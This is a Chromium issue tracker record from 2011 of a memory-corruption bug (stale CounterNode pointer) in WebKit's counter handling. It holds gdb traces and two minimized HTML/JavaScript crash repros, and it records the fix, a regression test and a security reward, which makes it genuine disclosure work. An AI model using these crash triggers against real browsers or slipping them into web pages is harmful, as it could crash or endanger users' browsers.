# Probable memory corruption in WebCore::CounterNode::lastDescendant

| Field | Value |
|-------|-------|
| **Issue ID** | [40086901](https://issues.chromium.org/issues/40086901) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | ch...@gmail.com |
| **Created** | 2011-01-14 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

It appears that under certain circumstances spacer elements (this may be arbitrary) with a value set for their counterIncrement property are not handled properly. In one of the test cases provided, a crash sometimes occurs due to an attempt to write to 0x200038 in WebCore::CounterNode::lastDescendant.

**VERSION**  

Chrome Version: Debugging done in Chromium 8.0.552.224 Ubuntu 10.04, also tested in Google Chrome 8.0.552.237  

Operating System: Ubuntu 10.04 (64-bit)

**REPRODUCTION CASE**  

Two test cases are attached. The first file, raw.html, does a better job of producing the more troubling crashes. The file trimmed.html usually crashes in WebCore::CounterNode::removeChild with this=0x0. The file raw.html often crashes at this location as well. In some cases I had to refresh trimmed.html a few times to trigger the crash. This file seems to have most of the unnecessary DOM operations removed. The file trimmed.html is, as the name implies, a trimmed version of raw.html to better demonstrate what is causing the issue, though it still contains a fair number of elements and operations.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

The following is a trace of the program in gdb produced when opening the file raw.html. This is attached, along with a separate trace using trimmed.html.

$ chromium-browser --debug --single-process raw.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser:<trimmed>

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:<trimmed>

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.AOREFd  

GNU gdb (GDB) 7.1-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /usr/lib/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) run  

Starting program: /usr/lib/chromium-browser/chromium-browser --single-process raw.html  

[Thread debugging using libthread\_db enabled]  

warning: the debug information found in "/usr/lib/debug//usr/lib/libxcb.so.1.1.0" does not match "/usr/lib/libxcb.so.1" (CRC mismatch).

warning: the debug information found in "/usr/lib/debug/usr/lib/libxcb.so.1.1.0" does not match "/usr/lib/libxcb.so.1" (CRC mismatch).

[New Thread 0x7fffe890f700 (LWP 11213)]  

[New Thread 0x7fffe810e700 (LWP 11214)]  

[New Thread 0x7fffe74ad700 (LWP 11215)]  

[New Thread 0x7fffe6cac700 (LWP 11216)]  

[New Thread 0x7fffe64ab700 (LWP 11217)]  

[New Thread 0x7fffe5caa700 (LWP 11218)]  

[New Thread 0x7fffe54a9700 (LWP 11219)]  

[New Thread 0x7fffe4ca8700 (LWP 11220)]  

[New Thread 0x7ffff4e38700 (LWP 11221)]  

[New Thread 0x7fffe44a7700 (LWP 11222)]  

[New Thread 0x7fffe3a7f700 (LWP 11223)]  

[Thread 0x7fffe3a7f700 (LWP 11223) exited]  

[New Thread 0x7fffe3a7f700 (LWP 11224)]  

[New Thread 0x7fffe0642700 (LWP 11225)]  

[11205:11220:58461951281:ERROR:chrome/browser/net/chrome\_url\_request\_context.cc(105)] Cannot use V8 Proxy resolver in single process mode.  

[New Thread 0x7fffdf749700 (LWP 11226)]  

[New Thread 0x7fffba96c700 (LWP 11227)]

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe3a7f700 (LWP 11224)]  

0x00007ffff6a70723 in WebCore::CounterNode::lastDescendant (  

this=0x7ffff922b900)  

at third\_party/WebKit/WebCore/rendering/CounterNode.cpp:78  

78 third\_party/WebKit/WebCore/rendering/CounterNode.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/CounterNode.cpp  

(gdb) bt  

#0 0x00007ffff6a70723 in WebCore::CounterNode::lastDescendant (  

this=0x7ffff922b900)  

at third\_party/WebKit/WebCore/rendering/CounterNode.cpp:78  

#1 0x00007ffff6a4881c in destroyCounterNodeWithoutMapRemoval (identifier=...,  

node=0x7ffff922b900)  

at third\_party/WebKit/WebCore/rendering/RenderCounter.cpp:354  

#2 0x00007ffff6a4a268 in WebCore::RenderCounter::destroyCounterNodes (  

renderer=0x7ffff8f8c710)  

at third\_party/WebKit/WebCore/rendering/RenderCounter.cpp:384  

#3 0x00007ffff694d040 in WebCore::RenderObject::destroy (this=0x7ffff8f8c710)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:2166  

#4 0x00007ffff6729f7a in WebCore::Node::detach (this=0x7ffff924d000)  

at third\_party/WebKit/WebCore/dom/Node.cpp:1214  

#5 0x00007ffff671c284 in WebCore::Element::detach (this=0x7ffff924d000)  

at third\_party/WebKit/WebCore/dom/Element.cpp:877  

#6 0x00007ffff66ecf5b in WebCore::ContainerNode::removeBetween (  

this=0x7ffff90c1700, previousChild=<value optimized out>,  

nextChild=<value optimized out>, oldChild=<value optimized out>)  

at third\_party/WebKit/WebCore/dom/ContainerNode.cpp:458  

#7 0x00007ffff66ef97d in WebCore::ContainerNode::removeChild (  

this=0x7ffff90c1700, oldChild=0x7ffff924d000, ec=<value optimized out>)  

at third\_party/WebKit/WebCore/dom/ContainerNode.cpp:435  

#8 0x00007ffff665a349 in WebCore::V8Node::removeChildCallback (args=...)  

---Type <return> to continue, or q <return> to quit---  

at third\_party/WebKit/WebCore/bindings/v8/custom/V8NodeCustom.cpp:105  

#9 0x00007ffff5e5c21b in HandleApiCallHelper<false> (args=...)  

at v8/src/builtins.cc:983  

#10 Builtin\_HandleApiCall (args=...) at v8/src/builtins.cc:1000  

#11 0x00007fffbaeba32a in ?? ()  

#12 0x00007fffbaedb9d6 in ?? ()  

#13 0x00007fffbaeba2c1 in ?? ()  

#14 0x00007fffe3a7e470 in ?? ()  

#15 0x00007fffe3a7e4f0 in ?? ()  

#16 0x00007fffbaedb47a in ?? ()  

#17 0x00007fffbadbc491 in ?? ()  

#18 0x00007fffdc0bd9c9 in ?? ()  

#19 0x00007fffdc0b19e9 in ?? ()  

#20 0x0000000500000000 in ?? ()  

#21 0x0000003300000000 in ?? ()  

#22 0x00007fffdc0fb539 in ?? ()  

#23 0x0000000000000000 in ?? ()  

(gdb) disassemble  

Dump of assembler code for function \_ZNK7WebCore11CounterNode14lastDescendantEv:  

0x00007ffff6a70710 <+0>: mov 0x38(%rdi),%rax  

0x00007ffff6a70714 <+4>: test %rax,%rax  

0x00007ffff6a70717 <+7>: jne 0x7ffff6a70723 <\_ZNK7WebCore11CounterNode14lastDescendantEv+19>  

0x00007ffff6a70719 <+9>: jmp 0x7ffff6a7072c <\_ZNK7WebCore11CounterNode14lastDescendantEv+28>  

0x00007ffff6a7071b <+11>: nopl 0x0(%rax,%rax,1)  

0x00007ffff6a70720 <+16>: mov %rdx,%rax  

=> 0x00007ffff6a70723 <+19>: mov 0x38(%rax),%rdx  

0x00007ffff6a70727 <+23>: test %rdx,%rdx  

0x00007ffff6a7072a <+26>: jne 0x7ffff6a70720 <\_ZNK7WebCore11CounterNode14lastDescendantEv+16>  

0x00007ffff6a7072c <+28>: repz retq  

End of assembler dump.  

(gdb) i r rax  

rax 0x200000 2097152  

(gdb) i r  

rax 0x200000 2097152  

rbx 0x7ffff8f8c710 140737370441488  

rcx 0x7ffff8f8c710 140737370441488  

rdx 0x200000 2097152  

rsi 0x7ffff922b900 140737373190400  

rdi 0x7ffff922b900 140737373190400  

rbp 0x7ffff9262e10 0x7ffff9262e10  

rsp 0x7fffe3a7e1a8 0x7fffe3a7e1a8  

r8 0x0 0  

r9 0x0 0  

r10 0x1 1  

r11 0x1 1  

r12 0x7fffe3a7e210 140737012818448  

r13 0x7ffff922b900 140737373190400  

r14 0x7ffff9298d60 140737373637984  

r15 0x7fffe3a7e210 140737012818448  

rip 0x7ffff6a70723 0x7ffff6a70723 <WebCore::CounterNode::lastDescendant() const+19>  

eflags 0x10206 [ PF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0  

(gdb) print \*this  

$1 = {<WTF::RefCounted[WebCore::CounterNode](javascript:void(0);)> = {[WTF::RefCountedBase](javascript:void(0);) = {  

m\_refCount = 1}, [WTFNoncopyable::Noncopyable](javascript:void(0);) = {[WTF::FastAllocBase](javascript:void(0);) = {<No data fields>}, <No data fields>}, <No data fields>},  

m\_hasResetType = false, m\_value = 1, m\_countInParent = 0,  

m\_renderer = 0x7ffff8f8c710, m\_parent = 0x0, m\_previousSibling = 0x0,  

m\_nextSibling = 0x0, m\_firstChild = 0x7ffff92b2d40,  

m\_lastChild = 0x7ffff922b8c0}  

(gdb) info locals  

lastChild = 0x200000  

last = 0x200000  

(gdb)

Note that the values of last and lastChild are each 0x200000.

## Attachments

- [trimmed.html](attachments/trimmed.html) (text/html; charset=us-ascii, 4.7 KB)
- [gdb_raw.txt](attachments/gdb_raw.txt) (text/plain; charset=us-ascii, 6.8 KB)
- [gdb_trimmed.txt](attachments/gdb_trimmed.txt) (text/plain; charset=us-ascii, 11.4 KB)
- [raw.html](attachments/raw.html) (text/html; charset=unknown-8bit, 33.4 KB)

## Timeline

### js...@chromium.org (2011-01-14)

Looks like another stale pointer issue in CounterNode.

@inferno - Please run this through the minimizer and see if you can further reduce it.

### in...@chromium.org (2011-01-16)

Reduced testcase from 95 lines to 22 lines. Both the trimmed.html and this testcase were crashing on a null refcounted counter parent (which i remember @cdn did). Cris, can you please double check and remove the security flags on this.

<script>
var nodes = Array();
function boom() {
nodes[5] = document.createElement('spacer');
nodes[5].style.counterIncrement = 'aaa';
document.documentElement.appendChild(nodes[5]);
nodes[12] = document.createElement('acronym');
document.documentElement.appendChild(nodes[12]);
nodes[21] = document.createElement('html');
nodes[23] = document.createElement('embed');
nodes[40] = document.createElement('fig');
nodes[44] = document.createElement('multicol');
document.documentElement.appendChild(nodes[44]);
nodes[45] = document.createElement('p');
nodes[5].appendChild(nodes[40]);
nodes[12].appendChild(nodes[5].cloneNode(false));
nodes[21].appendChild(nodes[23].cloneNode(false));
nodes[40].appendChild(nodes[45].cloneNode(false));
nodes[44].appendChild(nodes[5].cloneNode(false));
setTimeout('for(x in nodes) nodes[x].parentNode.removeChild(nodes[x]);', 150);
}
</script><body onload="boom();">

### in...@chromium.org (2011-01-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-26)

I was reducing Marty's other testcase which also triggered the counter node issue, but after minimizing it, the repro in #2 is much better. And just to show the problem, check out node's last child. it is in a messed state and looks freed. (refcount).

static void destroyCounterNodeWithoutMapRemoval(const AtomicString& identifier, CounterNode* node)
{
    CounterNode* previous;
    for (RefPtr<CounterNode> child = node->lastDescendant(); child && child != node; child = previous) {
        previous = child->previousInPreOrder();
        child->parent()->removeChild(child.get(), identifier);
        ASSERT(counterMaps().get(child->renderer())->get(identifier.impl()) == child);

### ch...@gmail.com (2011-01-28)

this was fixed by http://trac.webkit.org/changeset/76859

### sc...@gmail.com (2011-01-28)

[Empty comment from Monorail migration]

### ch...@gmail.com (2011-01-29)

filed upstream at https://bugs.webkit.org/show_bug.cgi?id=53344

I am going to land a regression test for this

### ch...@gmail.com (2011-01-29)

For reference here is the minimized version of the repro.


<script>
function boom() {
    var p = document.getElementById('p').cloneNode(false);
    document.getElementById('fig').appendChild(p);

    var count = document.getElementById('count').cloneNode(false);
    document.getElementById('multi').appendChild(count);

    document.location.reload();
}
</script>
<body onload="boom();">
    <spacer id='count' style='counter-increment: aaa 1;'>
        <fig id='fig'>
    </spacer>
    <acronym>
        <spacer style='counter-increment: aaa 1;'></spacer>
    </acronym>
    <multicol id='multi'></multicol>
    <p id='p'></p>
</body>


### ch...@gmail.com (2011-01-31)

Regression test landed on webkit 

http://trac.webkit.org/changeset/77142

### sc...@gmail.com (2011-02-02)

@MartyBarella: congrats! This qualifies for a $500 Chromium Security Reward.
Generally, we reward at high amounts when the repro file is reasonable close to minimal.

### ma...@gmail.com (2011-02-02)

Yeah, after I saw the first minimized repro I noticed that I had pruned out the node removals which must have made the crash quite a bit less reliable. I knew it seemed a bit odd that it couldn't be reduced further when I started the issue. Nice work as usual with identifying the cause of the problem and fixing the issue.

### in...@chromium.org (2011-02-09)

IMP. This is not applying cleanly to M9, we need to see if we have to revert CAROL's previous patch and then reapply r76859

### ch...@gmail.com (2011-02-28)

merged to m10 as http://trac.webkit.org/changeset/79928

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/69628?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086901)*
